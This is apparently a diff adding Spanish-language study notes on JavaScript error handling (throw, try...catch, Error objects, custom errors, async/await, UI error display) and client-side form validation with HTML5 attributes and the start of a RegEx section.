+Intentar acceder a una propiedad de una variable que sabes que debería existir, pero es null o undefined.
+Si no lo manejas, resultará en un TypeError no controlado, que es menos informativo que uno lanzado por ti.
+
+
+throw y	try...catch:
+
+Acción Principal | Flujo de Ejecución | Ubicación Típica | ¿Quién lo usa?
+
+throw:
+Lanza o genera una excepción.
+Detiene el flujo normal.
+Dentro de funciones o validaciones.
+El código que detecta el problema.
+
+try...catch:
+Captura y maneja una excepción.
+Restaura el flujo de ejecución.
+Alrededor de llamadas a funciones que pueden fallar.
+El código que llama al código problemático.
+
+
+### Usos de try...catch
+Manejar un error que ya fue lanzado
+permitiendo que el programa se recupere y continúe su ejecución en lugar de terminar
+Lo usas cuando llamas a código que sabes que podría fallar.
+
+1. Prevención de Caídas (Crash):
+Es la razón fundamental. 
+Envolver código arriesgado asegura que, si falla, tu aplicación no se detenga por completo.
+
+```
+try 
+{ const data = JSON.parse(userInput); } 
+catch (e)
+{ // Evita que la app muera si el JSON es inválido. console.error("JSON inválido."); }
+```
+
+2. Registro y Depuración
+El bloque catch proporciona el objeto de error (error), que contiene la pila de llamadas (stack).
+##### Esto es esencial para registrar el error en un sistema de logging
+(como Sentry o la consola) para su posterior depuración.
+
+```
+} catch (error) 
+{ console.error("Ruta de fallo:", error.stack); // ¡Crucial para debug! }
+```
+
+3. Manejo de Errores Silencioso
+Cuando un fallo es esperado y quieres que la aplicación simplemente ignore el error o lo resuelva de manera alternativa
+(ej. si falla la conexión primaria, intentar con una secundaria).
+
+```
+try 
+{ conectarServidorPrincipal(); } 
+catch (e) 
+{ conectarServidorSecundario(); // Intentar alternativa }
+```
+
+4. Limpieza (con finally)
+Aunque técnicamente no es solo del catch, la estructura completa try...catch...finally
+es necesaria para garantizar que se ejecuten tareas de limpieza
+(como cerrar un archivo o una conexión de red)
+sin importar si el código en try tuvo éxito o falló.
+
+```
+try { // ... } 
+catch (e) { // ... } 
+finally { connection.close(); }
+```
+
+
+### try... catch sin throw
+
+##### Esto se hace cuando estás interactuando con código que no controlas
+##### O cuando manejas operaciones inherentemente riesgosas
+
+1. Manejar excepciones externas o errores de tiempo de ejecución que no puedes predecir o controlar en tu código, pero que sabes que pueden ocurrir.
+
+Procesar Datos Inseguros o Externos:
+caso de uso más común
+cuando intentas convertir una cadena de texto a JSON usando el método nativo JSON.parse().
+Riesgo: Si la cadena de entrada (input) no tiene el formato JSON correcto (es decir, está malformada)
+JSON.parse() lanzará un SyntaxError por sí mismo.
+
+No usas throw, pero envuelves la llamada porque sabes que el motor de JavaScript puede lanzarlo.
+El bloque catch te permite manejar la falla de forma elegante.
+
+```
+const datosExternos = '{"nombre": "Ana", "edad": 30}'; // JSON Válido
+const datosMalos = '{nombre: "Beto", edad: 40}';       // JSON Inválido (sin comillas)
+
+try {
+  // Intentamos parsear datos que vienen de fuera (ej. una API o un usuario)
+  const objeto = JSON.parse(datosMalos); 
+  console.log(objeto.nombre);
+} catch (error) {
+  // El error es lanzado por JSON.parse(), no por tu código.
+  console.error("⛔ Error de parsing:", error.message); 
+  // Aquí puedes asignar un valor por defecto o notificar al usuario.
+}
+// El programa continúa
+```
+
+
+2. Llamadas a Bibliotecas o APIs de Terceros
+
+Si utilizas una biblioteca externa y sabes que una de sus funciones puede fallar debido a una configuración interna o un estado incorrecto
+(ej. un fallo de conexión), usas try...catch para aislar ese riesgo.
+
+Riesgo: Una función de una librería puede intentar acceder a una propiedad undefined o lanzar un error de validación interno.
+
+Motivo de Uso: El try...catch actúa como una barrera protectora alrededor de la llamada a código de terceros que no puedes modificar ni garantizar su fiabilidad.
+
+
+3. Manejar Errores de Referencia o Tipo (Cuando se Esperan)
+
+Aunque generalmente se prefieren las comprobaciones previas, a veces usas try...catch para manejar errores de programación no fatales de forma controlada
+
+Riesgo: Intentar llamar a una función que podría no estar definida en ciertas circunstancias o entornos.
+
+Motivo:
+
+```
+try {
+  // Si 'posibleFuncion' no existe, JS lanzará un ReferenceError.
+  if (typeof posibleFuncion === 'function') {
+     posibleFuncion(); 
+  }
+} catch (e) {
+  // Manejar el caso en que la función no está disponible.
+}
+```
+
+
+#### Cuando try... catch sin throw es un antipatrón
+
+##### Es una mala práctica usar try...catch para envolver grandes bloques de código
+
+##### o para manejar errores que deberías haber prevenido con una simple comprobación (if).
+
+1. Ocultar Errores de Lógica (try...catch sin re-lanzar)
+
+##### El mayor anti-patrón es usar try...catch para "silenciar" errores que no deberían ocurrir, especialmente si no registras el error (console.error o logging).
+
+```
+// MALO: Silencia un error de lógica y no lo registra
+try {
+  miFuncion(null); // Si miFuncion espera un objeto y falla, nadie lo sabrá.
+} catch (e) {
+  // Bloque vacío o solo un comentario: ¡NUNCA HAGAS ESTO!
+}
+```
+
+
+2. Sustituir Comprobaciones de Propiedades
+
+No uses try...catch para comprobar si una propiedad existe; usa el encadenamiento opcional (?.) o comprobaciones if.
+
+Mal: 
+
+```
+try { 
+console.log(objeto.propiedad.valor); } 
+catch (e) { 
+console.log(undefined); }
+```
+
+Bien: 
+
+```
+console.log(objeto?.propiedad?.valor);
+```
+
+##### Usa try...catch sin tu propio throw cuando el riesgo proviene de fuera (datos externos, librerías)
+
+##### o de funciones nativas de JS que lanzan errores estándar (como JSON.parse).
+
+##### Nunca lo uses para tapar tus propios errores de lógica.
+
+
+### Uso de throw dentro de try... catch
+
+
+#### 1. throw dentro de catch: re-lanzamiento del error
+
+Error Re-throwing:
+##### El objetivo nunca es el mismo que lanzar un error en el bloque try (que es señalar la falla original)
+##### en catch: el objetivo es propagarlo después de haber realizado un manejo parcial o una limpieza.
+
+Motivos: 
+Permite que tu código haga dos cosas importantes:
+
+1. Registrar y Continuar la Propagación (Logging)
+Quieres registrar la información del error (para depuración, alertas, etc.)
+##### Pero no quieres que tu función actual lo "resuelva" por completo
+porque la función llamadora necesita saber que la operación falló.
+
+Registrar y Propagar:
+El bloque catch registra el error a nivel local
+(ej. lo envía a un servidor de logging o lo imprime con detalles de depuración)
+pero luego lo re-lanza para que el nivel superior de la aplicación lo capture y lo maneje con una lógica de error de más alto nivel
+(ej. mostrar un mensaje genérico al usuario o revertir una transacción)
+
+```
+function procesarDatos(datos) {
+  try {
+    // Lógica que puede fallar, ej. acceso a BD
+    conexion.guardar(datos); 
+  } catch (error) {
+    // 1. Manejo local: Registrar el error detalladamente
+    console.error("Fallo al guardar en la BD:", error.stack); 
+    
+    // 2. Re-lanzamiento: Propagar el error
+    throw error; // ¡El error original continúa su camino!
+  }
+}
+```
+
+
+2. Transformar Errores (Error Mapping)
+##### A menudo, quieres "envolver" un error de bajo nivel (como un fallo de base de datos o de red) en un error de alto nivel
+más significativo para la lógica de tu aplicación.
+
+Mapear Errores:
+El bloque catch captura un error técnico (DbConnectionError, NetworkTimeout).
+Luego, lanza un nuevo error con un nombre y mensaje más relevantes para el negocio
+(ej. NoSePudoCompletarTransaccion)
+
+```
+try {
+  // Lógica de bajo nivel (ej. librería externa)
+  libreriaDePagos.cobrar(monto);
+} catch (error) {
+  if (error.name === 'TimeoutError') {
+    // Lanzamos un error de negocio específico
+    throw new Error("El servicio de pagos tardó demasiado en responder."); 
+  }
+  // Si no es un TimeoutError, re-lanzamos el original
+  throw error; 
+}
+```
+
+##### !!! Nunca debes usar throw dentro de catch si el objetivo principal del bloque catch es resolver el error y permitir que el programa continúe normalmente.
+Si el error es manejado y resuelto
+(ej. se intenta con un servidor de backup o se devuelve un valor por defecto)
+NO se debe re-lanzar el error
+Si lo haces, el manejo de la recuperación será inútil, ya que el programa se detendrá de nuevo.
+
+
+#### 2. throw dentro de try: forma estándar
+
+Método principal para señalar que algo ha fallado y para iniciar el proceso de manejo de errores
+
+try...catch está diseñado para encapsular y monitorear el código donde se espera un fallo potencial
+ya sea que lo lance JavaScript (automáticamente) o que lo lances tú (manualmente).
+
+1. Validar Argumentos antes de Ejecutar la Lógica
+##### validación temprana: Si una función se da cuenta de que sus argumentos son inválidos o insuficientes, no debe continuar con su lógica.
+##### Motivo de Uso: Garantizar que la función solo opere con datos válidos
+##### Si los datos no son válidos, lanzas un error antes de que el código llegue a la parte que podría causar problemas internos más graves: un bug de lógica, en lugar de un error de validación claro
+
+```
+function calcularImpuesto(monto) {
+  // El 'throw' ocurre aquí, dentro de la función, que está envuelta por 'try' externamente.
+  if (typeof monto !== 'number' || monto <= 0) {
+    // Si la condición es inválida, lanzamos un error inmediatamente.
+    throw new TypeError("El monto debe ser un número positivo."); 
+  }
+  
+  // Si la validación pasa, el código continúa
+  return monto * 0.15; 
+}
+
+// Así es como el código llamador lo usa:
+try {
+  let impuesto = calcularImpuesto("cien"); // Lanza el TypeError
+  console.log(impuesto);
+} catch (error) {
+  console.error("⛔ Error de cálculo:", error.message);
+}
+```
+
+
+2. Señalar Fallos de Lógica de Negocio
+Cuando una condición del negocio no se cumple, usas throw para comunicarlo al nivel superior de la aplicación.
+
+Motivo de Uso: Informar que la operación, aunque técnicamente posible, es prohibida por las reglas de la aplicación.
+Ejemplo: Un usuario intenta comprar un producto que acaba de agotarse. El código que verifica el stock lanza un error
+y el catch externo lo maneja mostrando un mensaje al usuario.
+
+
+3. Crear Tu Propio Punto de Falla Controlado
+##### Cuando llamas a una función que no está garantizada, tú defines el punto de interrupción.
+##### Sin try...catch: Si la validación falla, el programa se detiene.
+##### Con try...catch: Si la validación falla con throw el control pasa inmediatamente al bloque catch asociado, permitiendo una recuperación controlada.
+
+
+try (o la función que está dentro)
+lanzamiento: manualmente o js 
+Inicio de la Alarma: Señalar que la operación no puede continuar debido a una entrada o estado inválido.
+
+catch: 
+manualmente 
+Propagación/Transformación: Re-lanzar el error después de haberlo registrado o envuelto en un error de negocio más relevante.
+
+
+
+## 2. Object Error
+
+Propiedades clave: message, name, y stack (pila de llamadas).
+
+Creación de instancias: new Error("Mi mensaje de error").
+
+
+Error: 
+Instancia que se crea y se lanza (generalmente usando throw)
+Es lo que el bloque catch recibe y lo que te proporciona toda la información necesaria para diagnosticar y resolver el fallo.
+
+Es el constructor base del cual heredan todos los demás tipos de errores
+Cuando utilizas throw new Error("Algo salió mal"), estás creando una instancia de este objeto
+
+Propiedades de Error: 
+Todo objeto Error estándar viene con al menos las siguientes tres propiedades fundamentales:
+
+1. message
+Una descripción textual legible del error
+Es el argumento que se pasa al constructor.
+Ej de valor: "Archivo no encontrado."
+
+2. name
+El nombre del tipo de error
+Útil para diferenciar errores en el bloque catch.
+Por defecto, es "Error".
+Ej de valores: "TypeError", "ReferenceError", "MiErrorPersonalizado"
+
+3. stack
+pila de llamadas (call stack).
+Es una cadena que muestra la secuencia de funciones
+funciones que se llamaron hasta el punto donde se lanzó el error
+Ej: at miFuncion (archivo.js:10:5)
+
+```
+try {
+  throw new Error("Datos de usuario inválidos");
+} catch (error) {
+  console.log(error.name);    // "Error"
+  console.log(error.message); // "Datos de usuario inválidos"
+  console.log(error.stack);   // Muestra la ruta de fallo
+}
+```
+
+
+Tipos de Errores Nativos (Subclases):
+Subclases del Objeto Error para categorizar problemas comunes
+##### Cuando ocurre uno de estos errores, el valor de la propiedad name cambia para reflejar el tipo de problema.
+
+1. ReferenceError:
+Error al referenciar algo.
+Intentar usar una variable o función que no ha sido declarada (console.log(noDeclarada)).
+
+2. TypeError
+Uso de un tipo de dato incorrecto.
+Intentar llamar a una variable que es un número (no una función)
+o intentar leer una propiedad de null o undefined.
+
+3. SyntaxError
+Error de gramática del lenguaje.
+El motor de JS no puede analizar el código (ej. falta una llave } o un paréntesis )).
+No puede ser capturado por try...catch en la función donde ocurre, solo por el entorno externo.
+
+4. RangeError
+Un valor numérico está fuera de un rango aceptable
+Recursión infinita (la pila de llamadas se desborda)
+o usar el constructor Array con un número negativo.
+
+5. URIError
+Uso inválido de funciones de URI.
+Fallo al usar encodeURI() 
+o decodeURI() con caracteres malformados
+
+
+Errores Personalizados:
+
+#### Para manejar la lógica de negocio es una buena práctica crear tus propias clases de error.
+Esto permite al código en el bloque catch reaccionar de forma específica y limpia.
+
+Se consigue heredando de la clase Error base:
+
+```
+class SaldoInsuficienteError extends Error {
+  constructor(monto) {
+    // Llama al constructor del Error base
+    super(`El saldo es insuficiente para retirar ${monto}`);
+    
+    // Establece un nombre específico para diferenciarlo en el catch
+    this.name = "SaldoInsuficienteError"; 
+    
+    // (Opcional) Propiedades adicionales
+    this.montoSolicitado = monto;
+  }
+}
+```
+
+Uso: 
+
+```
+try {
+  throw new SaldoInsuficienteError(500);
+} catch (error) {
+  if (error.name === "SaldoInsuficienteError") {
+    console.warn(`Alerta de negocio: ${error.message}`);
+  }
+}
+```
+
+
+### Tipos de Errores Nativos Comunes:
+
+SyntaxError (Errores de análisis léxico, no capturables por try...catch en la función donde ocurren).
+ReferenceError (Variables no definidas).
+TypeError (Uso de un valor donde no se espera, ej. llamar a algo que no es una función).
+RangeError (Valores fuera del rango de valores válidos, ej. recursión infinita).
+URIError (Errores en funciones encodeURI/decodeURI).
+
+
+
+### Creación de Clases de Errores Personalizados
+
+Usando extends Error {...}.
+Establecer un name personalizado para una fácil identificación.
+
+Propias clases de error que son más específicas y significativas que los errores nativos de JavaScript, como Error o TypeError.
+El objetivo es pasar de errores técnicos (ej. "Referencia no definida")
+a errores específicos de tu lógica de negocio (ej. "Saldo Insuficiente" o "Producto Agotado").
+
+Razón: mejorar la clasificación y el manejo selectivo de los errores.
+
+1. Identificación Clara:
+Permite distinguir de inmediato un error de validación de un error de red o de base de datos.
+
+2. Manejo Selectivo
+En el bloque catch, puedes usar instanceof para ejecutar lógica de recuperación solo para ciertos tipos de errores.
+
+3. Más Contexto
+Puedes añadir propiedades adicionales al objeto de error (ej. el código de un producto, el nivel de stock actual) para facilitar la depuración.
+
+3. Código Más Limpio
+La lógica de manejo de errores se vuelve más legible y menos propensa a usar cadenas de texto para comparar tipos de error.
+
+
+Para crear un error personalizado simplemente extiendes la clase base Error 
+usando la sintaxis de clases (class extends Error).
+
+```
+// Paso 1: Definir la clase que hereda de Error
+class SaldoInsuficienteError extends Error {
+  // Paso 2: Constructor
+  constructor(saldoActual, montoSolicitado) {
+    // 2a. Llamar al constructor de la clase base 'Error' (super())
+    super(`El saldo (${saldoActual}) es insuficiente para el retiro de ${montoSolicitado}.`);
+    
+    // 2b. Configurar el nombre del error
+    // Esto es crucial para la propiedad 'name' y para el instanceof
+    this.name = 'SaldoInsuficienteError'; 
+    
+    // 2c. (Opcional) Añadir propiedades de contexto
+    this.saldo = saldoActual;
+    this.monto = montoSolicitado;
+
+    // Nota: Es buena práctica asegurar que la pila de llamadas se capture correctamente
+    // En entornos modernos (ES6+), esto es a menudo automático.
+  }
+}
+``` 
+
+Uso: 
+Una vez definido el error, puedes usarlo con throw
+luego capturarlo y tratarlo de forma específica usando el operador instanceof en el bloque catch
+
+1. Lanzamiento del Error
+
+```
+function realizarRetiro(cuenta, monto) {
+  if (cuenta.saldo < monto) {
+    // Lanzamos la instancia de nuestro error personalizado
+    throw new SaldoInsuficienteError(cuenta.saldo, monto); 
+  }
+  cuenta.saldo -= monto;
+  return true;
+}
+```
+
+
+2. Captura y Manejo Selectivo
+
+```
+const cuentaDeJuan = { saldo: 100 };
+
+try {
+  realizarRetiro(cuentaDeJuan, 500); // Esto lanzará nuestro error
+} catch (error) {
+  // Verificamos si es nuestro error personalizado
+  if (error instanceof SaldoInsuficienteError) {
+    // Lógica específica para este error (ej. mostrar un pop-up especial)
+    console.warn(`💰 ¡ERROR DE NEGOCIO! Saldo insuficiente. Saldo actual: ${error.saldo}`);
+    console.log("Acción: Sugerir depósito al usuario.");
+    
+  } else if (error instanceof TypeError) {
+    // Lógica para un error nativo diferente (ej. si pasamos un string en lugar de un número)
+    console.error("⛔ Error de programación: Tipo de dato incorrecto.");
+    
+  } else {
+    // Errores desconocidos
+    console.error("❌ Error no manejado:", error);
+  }
+}
+```
+
+##### Al usar instanceof, puedes tener un único bloque try...catch que maneje múltiples tipos de errores con lógica de recuperación completamente diferente, haciendo tu código mucho más robusto.
+
+
+
+### Manejo de Errores con async/await
+
+Usar try...catch alrededor de las llamadas await. Este es el método preferido.
+Comprender que await lanza una excepción si la Promesa se rechaza.
+
+Permite usar el familiar bloque try...catch de forma síncrona.
+
+1. await y la Transformación
+await trata las Promesas
+
+Promesa Exitosa (Resuelta):
+await devuelve el valor de resolución.
+
+Promesa Fallida (Rechazada):
+(ej. un fallo de red o un return reject())
+await lanza una excepción de JavaScript (un throw implícito).
+
+Gracias a esta transformación, el motor de JavaScript trata el rechazo de la Promesa como un error de tiempo de ejecución que puede ser capturado por un bloque try...catch que lo rodea.
+
+
+2. Patrón Estándar: try...catch
+##### En una función async: envolver la o las llamadas a await dentro de un bloque try...catch.
+
+```
+async function obtenerDatosDeUsuario(id) {
+  try {
+    // 1. Código que puede fallar (ej. la API devuelve un 404)
+    const respuesta = await fetch(`https://api.ejemplo.com/usuarios/${id}`);
+    
+    // 2. Manejo de errores HTTP (la promesa fetch no se rechaza con 404)
+    if (!respuesta.ok) {
+      // Lanzamos nuestro propio error para ser capturado por el catch de abajo
+      throw new Error(`Error HTTP: ${respuesta.status}`); 
+    }
+
+    const datos = await respuesta.json();
+    return datos;
+    
+  } catch (error) {
+    // 3. Este catch captura:
+    //    a) Errores lanzados por el navegador (ej. fallo de red).
+    //    b) Errores lanzados por nosotros (ej. el 'throw' del status 404).
+    //    c) Errores lanzados por Promesas rechazadas (como 'fetch' o '.json()').
+    
+    console.error("Fallo al obtener datos del usuario:", error.message);
+    
+    // Es una buena práctica devolver un valor seguro o un error más limpio
+    return null; 
+  }
+}
+```
+
+
+#### Peligro: Promesas no Awaited
+##### Si utilizas await pero no lo envuelves en un try...catch, y la Promesa falla, el error se propagará fuera de la función async.
+##### Si el error no es capturado por la función llamadora, se convertirá en un UnhandledPromiseRejection global
+(una advertencia en Node.js, y un posible crash en el navegador si no se maneja).
+
+```
+// La función NO usa try...catch.
+async function fetchDataUnsafe() {
+  const data = await Promise.reject(new Error("Fallo sin captura")); // Esto lanza una excepción
+  return data;
+}
+
+// El error será 'uncaught' a menos que la función llamadora lo maneje.
+async function main() {
+  try {
+    await fetchDataUnsafe(); // El try...catch AQUI sí lo captura
+  } catch (e) {
+    console.error("Error capturado en main:", e.message); // -> Error capturado en main: Fallo sin captura
+  }
+}
+```
+
+
+
+### Mostrar errores en la ui
+
+No solo se trata de capturar el error, sino de traducir ese fallo técnico en un mensaje informativo y amigable para el usuario
+
+#### 1. Captura de Errores (El Front-End try...catch)
+##### La primera capa es siempre atrapar los errores que pueden ocurrir, especialmente los provenientes de operaciones asíncronas (como llamadas a APIs).
+
+1. Lógica de API (Async/Await):
+Utiliza try...catch alrededor de las llamadas a servicios o funciones que sabes que podrían fallar
+(errores de red, timeouts, fallos de parsing).
+
+```
+async function obtenerDatos() {
+  try {
+    const response = await fetch('/api/datos');
+    if (!response.ok) {
+        // Lanzamos un error si el estado HTTP es 4xx o 5xx
+        throw new Error(`HTTP Error: ${response.status}`);
+    }
+    return await response.json();
+  } catch (error) {
+    // 1. CAPTURA: El error es atrapado aquí.
+    // 2. LLAMADA A MOSTRAR: Llamamos a una función centralizada.
+    mostrarErrorUI("Ocurrió un error al cargar los datos.", error.message);
+    return null; 
+  }
+}
+```
+
+
+2. Validación de Formulario: 
+Para errores lanzados por validación de inputs (como campos vacíos, formatos incorrectos)
+usa try...catch alrededor de la función de envío (submit handler).
+
+
+#### 2. Centralización y Normalización
+La buena práctica es tener una única función central para manejar cómo se presenta un error
+Garantiza consistencia en el diseño y el tono.
+
+Tu función central de manejo de errores debería recibir al menos dos argumentos:
+1. mensajeAmigable: Lo que el usuario ve ("No pudimos guardar tu perfil").
+2. mensajeTecnico (opcional): Lo que el desarrollador ve (el error.message o error.stack).
+
+```
+// Función centralizada para mostrar y registrar errores
+function mostrarErrorUI(mensajeAmigable, mensajeTecnico) {
+  // A. Registro (Logging)
+  console.error("Error técnico (Dev):", mensajeTecnico);
+  
+  // B. Presentación en la UI
+  // Llama a las funciones específicas de tu framework/librería
+  renderizarMensaje(mensajeAmigable); 
+}
+```
+
+
+#### 3. Técnicas de Presentación de errores en la UI
+
+La manera de mostrar el error depende de la gravedad y el contexto:
+
+1. Mensaje junto al Campo (Validación de Formulario)
+
+Para errores de validación (input incorrecto, campo faltante), la mejor UX es mostrar el mensaje directamente al lado del campo que lo causó.
+
+```
+function mostrarErrorCampo(campoId, mensaje) {
+    const campo = document.getElementById(campoId);
+    // Añadir una clase CSS para resaltar el borde del campo en rojo
+    campo.classList.add('campo-error');
+
+    // Insertar un <span> o <p> con el mensaje justo debajo
+    let elementoMensaje = document.getElementById('error-' + campoId);
+    if (!elementoMensaje) {
+        elementoMensaje = document.createElement('p');
+        elementoMensaje.id = 'error-' + campoId;
+        campo.parentNode.insertBefore(elementoMensaje, campo.nextSibling);
+    }
+    elementoMensaje.textContent = mensaje;
+}
+//
+```
+
+
+2. Notificaciones Flotantes (Toasts/Alerts)
+
+Ideales para errores no fatales o errores de API que no requieren la detención de la actividad del usuario
+(ej. "La notificación falló al enviarse").
+
+Técnica: Usa librerías como Toastify o componentes de tu framework 
+(ej. Material UI Snackbar, Bootstrap Toasts).
+
+Características: Desaparecen automáticamente después de unos segundos, pero pueden tener un botón de "cerrar".
+
+
+#### 3. Modales (Ventanas Emergentes)
+
+Utilizados para errores fatales o críticos que impiden que el usuario continúe o que requieren una acción inmediata
+(ej. "Su sesión ha expirado, por favor inicie sesión de nuevo").
+
+Características: Bloquean la interacción con el resto de la página.
+
+
+#### 4. Manejo de Errores Globales (Último Recurso)
+
+Esto solo debe capturar errores que no se capturaron con try...catch (errores no controlados, o uncaught exceptions).
+
+1. window.onerror (Errores Síncronos)
+Captura la mayoría de los errores de JavaScript que no están dentro de un try...catch.
+
+```
+window.onerror = function (message, source, lineno, colno, error) {
+  // Manejar el error de última instancia
+  mostrarErrorUI("Ocurrió un error inesperado. Por favor, recargue la página.", error ? error.message : message);
+  // Devolver true suprime el informe de error por defecto del navegador
+  return true; 
+};
+```
+
+2. unhandledrejection (Rechazos de Promesa no Controlados)
+Captura Promesas que fueron rechazadas y a las que nunca se les agregó un .catch().
+
+```
+window.addEventListener('unhandledrejection', (event) => {
+  // event.reason contiene el objeto de error rechazado
+  mostrarErrorUI("Error asíncrono no controlado.", event.reason ? event.reason.message : "Desconocido");
+  event.preventDefault(); // Opcional: previene el manejo por defecto del navegador
+});
+```
+
+Nunca muestres el error.stack directamente al usuario final.
+Traduce el fallo técnico en un mensaje conciso, actionable (que incite a una acción)
+Con una presentación visual clara (color rojo, icono de advertencia).
+
+
+
+
+# Validaciones 
+
+## Fundamentos Validación Client-Side
+
+Mejora la experiencia del usuario (UX) al proporcionar feedback instantáneo.
+
+1. Uso de Atributos HTML5:
+required: Asegura que un campo no esté vacío.
+minlength/maxlength: Controla la longitud del texto.
+min/max: Controla el rango de valores numéricos.
+type (ej. email, number, url): Utiliza validación de formato incorporada.
+pattern: Uso básico de expresiones regulares (RegEx) para formatos específicos (ej. códigos postales, matrículas).
+
+2. La API de Validación de Restricciones (Constraint Validation API):
+Métodos clave: checkValidity(), reportValidity().
+Propiedades: validity (objeto que contiene flags como valueMissing, typeMismatch, patternMismatch).
+Personalización de mensajes de error con setCustomValidity().
+
+3. Validación con JavaScript Puro (Escuchadores de Eventos):
+Uso de eventos submit en formularios y input/change/blur en campos individuales para validar dinámicamente.
+Mostrar y ocultar mensajes de error de forma manual junto a los campos.
+
+
+
+### Validación Client-Side
+
+Verificación de los datos de un formulario antes de que estos sean enviados al servidor
+proceso que se ejecuta directamente en el navegador web del usuario utilizando HTML y JavaScript.
+
+Primera línea de defensa para la calidad de los datos
+Mejora significativamente la Experiencia del Usuario (UX).
+
+
+Ventajas:
+
+1. Feedback Inmediato:
+El usuario recibe una advertencia instantánea (ej. borde rojo, mensaje de error)
+en cuanto abandona un campo o intenta enviar el formulario, sin esperar la respuesta del servidor.
+
+2. Menos Carga al Servidor:
+Reduce el número de solicitudes HTTP innecesarias que contienen datos inválidos.
+
+3. Mejor UX:
+Hace que el proceso de rellenar formularios sea más rápido y menos frustrante.
+
+
+#### Mecanismos validación en el cliente:
+Existen dos formas principales de implementar la validación del lado del cliente: HTML5 (declarativa) y JavaScript (programática).
+
+1. Validación Declarativa (HTML5):
+Forma más fácil y rápida, y no requiere escribir código JavaScript
+Se basa en atributos de HTML que el navegador interpreta automáticamente.
+
+required: Asegura que el campo no esté vacío.
+`<input type="text" required>`
+
+type="email": El navegador verifica que el texto siga un formato básico de correo electrónico.
+`<input type="email">`
+
+minlength/maxlength: Define el rango permitido para la longitud de una cadena de texto.
+`<input minlength="8" maxlength="20">`
+
+min/max: Define el rango de valores para campos numéricos o de fecha.
+`<input type="number" min="1" max="100">`
+
+pattern: Permite especificar una Expresión Regular (RegEx) personalizada para formatos complejos
+(ej. código postal, formato de teléfono).
+`<input pattern="[0-9]{3}-[0-9]{2}">`
+
+
+2. Validación Programática (JavaScript Puro o Frameworks)
+Se usa para validaciones más complejas o cuando necesitas personalizar completamente la experiencia.
+
+#### La API de Restricciones (Constraint Validation API):
+JavaScript moderno ofrece una API nativa que interactúa con los atributos HTML5 para verificar y personalizar los errores
+
+`input.checkValidity()`
+Devuelve true si el campo cumple con todos los atributos HTML5 (como required, pattern, etc.)
+o false en caso contrario.
+
+`input.validity`
+Es un objeto que contiene flags booleanos
+(ej. valueMissing, typeMismatch, tooLong)
+que indican qué restricción ha fallado.
+
+`input.setCustomValidity(mensaje)`
+Permite reemplazar el mensaje de error por defecto del navegador con uno personalizado.
+
+
+#### Manejo de Eventos
+La validación con JavaScript puro generalmente se vincula a eventos:
+
+1. Evento submit:
+Se utiliza para realizar la validación final de todos los campos antes de que los datos se envíen
+Si la validación falla, se llama a event.preventDefault().
+
+2. Eventos input o blur:
+Se utilizan para realizar la validación en tiempo real a medida que el usuario escribe o sale de un campo
+ofreciendo feedback instantáneo.
+
+
+Limitaciones:
+Es solo una mejora de UX, nunca un mecanismo de seguridad.
+
+1. Seguridad Cero:
+Un usuario malicioso puede fácilmente desactivar JavaScript en su navegador o interceptar y modificar los datos enviados al servidor.
+
+2. Validación de Negocio:
+No puede verificar la lógica de negocio que requiere acceder a datos del servidor
+(ej. "¿El nombre de usuario ya está registrado?" o "¿Hay suficiente stock?").
+
+La validación del lado del cliente siempre debe complementarse con la Validación del Lado del Servidor (Server-Side)
+
+
+
+### Atributos HTML5
+
+Forma más sencilla y poderosa de realizar la validación del lado del cliente sin necesidad de escribir JavaScript
+El navegador web se encarga de la lógica de verificación basándose en estas etiquetas declarativas.
+
+Estos atributos se añaden directamente a las etiquetas de formulario 
+(<input>, <select>, <textarea>) y obligan al navegador a aplicar reglas de validación.
+
+1. Requerimiento de Contenido
+
+required: booleano
+Obliga al usuario a rellenar el campo
+Si está vacío, el formulario no se enviará, y el navegador mostrará un mensaje por defecto
+`<input type="text" required>`
+
+
+2. Validación de Tipo y Formato
+El atributo type es crucial, ya que el navegador ya incluye lógica de validación incorporada para varios tipos.
+
+email: 
+Verifica que el valor contenga al menos un @ y un punto (.).
+No es una validación de correo perfecta, pero es útil.
+`<input type="email" required>`
+
+url:
+Verifica que el valor sea una dirección web válida
+(ej. que comience con http:// o https://).
+`<input type="url">`
+
+number:
+Solo permite números
+Si se ingresa texto, el navegador lo marca como inválido.
+`<input type="number">`
+
+date / time:
+Fuerza al campo a contener fechas u horas en el formato estándar
+`<input type="date">` 
+
+
+3. Restricciones de Longitud y Rango
+Estos atributos limitan el tamaño o el valor del dato.
+
+minlength:
+Define el número mínimo de caracteres permitidos para campos de texto.
+`<input minlength="8">`
+(Mínimo 8 caracteres)
+
+maxlength:
+Define el número máximo de caracteres permitidos.
+`<input maxlength="50">`
+
+min:
+Define el valor mínimo permitido para campos numéricos (number) o de fecha (date).
+`<input type="number" min="18">`
+(Mayor o igual a 18)
+
+max:
+Define el valor máximo permitido para campos numéricos o de fecha
+`<input type="number" max="99">`
+
+
+4. Atributo pattern (reglas personalizadas)
+El más flexible
+Permite definir una Expresión Regular (RegEx) que el valor del campo debe igualar exactamente para considerarse válido.
+Ideal para formatos estrictos como códigos postales, contraseñas complejas o identificadores específicos.
+
+```
+<input 
+  type="text" 
+  pattern="[A-Z]{3}-[0-9]{4}" 
+  title="El formato debe ser AAA-9999 (ej. ABC-1234)"
+  required
+>
+```
+
+##### Importante: El atributo title es crucial aquí, ya que a menudo se utiliza para proporcionar el mensaje de error o pista al usuario cuando la validación del pattern falla.
+
+
+##### Cuando una restricción de HTML5 falla (ej. dejas un campo required vacío o el pattern no coincide
+
+1. El navegador detiene el envío del formulario (event.preventDefault() es automático).
+
+2. El navegador muestra una burbuja de mensaje de error cerca del campo infractor
+Este mensaje es nativo del navegador, pero su contenido puede ser influenciado por el atributo title o por la API de Validación de Restricciones de JavaScript.
+
+3. El campo infractor recibe un pseudo-selector CSS llamado :invalid
+Permite a los desarrolladores aplicar estilos visuales (como un borde rojo) para alertar al usuario.
+
+
+
+## Expresiones Regulares (RegEx) para Validación
+
+Herramienta fundamental para la validación de formato compleja.
+
+1. Conceptos Fundamentales de RegEx:
+Anclas: ^ (inicio) y $ (fin).
+Clases de caracteres: \d (dígito), \w (palabra), . (cualquier carácter).
+Cuantificadores: + (uno o más), * (cero o más), {n,m} (entre n y m).
+Grupos y Alternancia: () y |.
+
+2. Casos de Uso Comunes:
+Validación de correos electrónicos.
+Validación de contraseñas fuertes (longitud, mayúsculas, números, símbolos).
+Validación de números de teléfono y fechas con formato estricto.
+
+
+### RegEx en client-side
+
+Permite verificar que las cadenas de texto (como contraseñas, correos, o códigos) sigan un patrón o formato estricto.
+
+1. RegEx
+Secuencia de caracteres que define un patrón de búsqueda
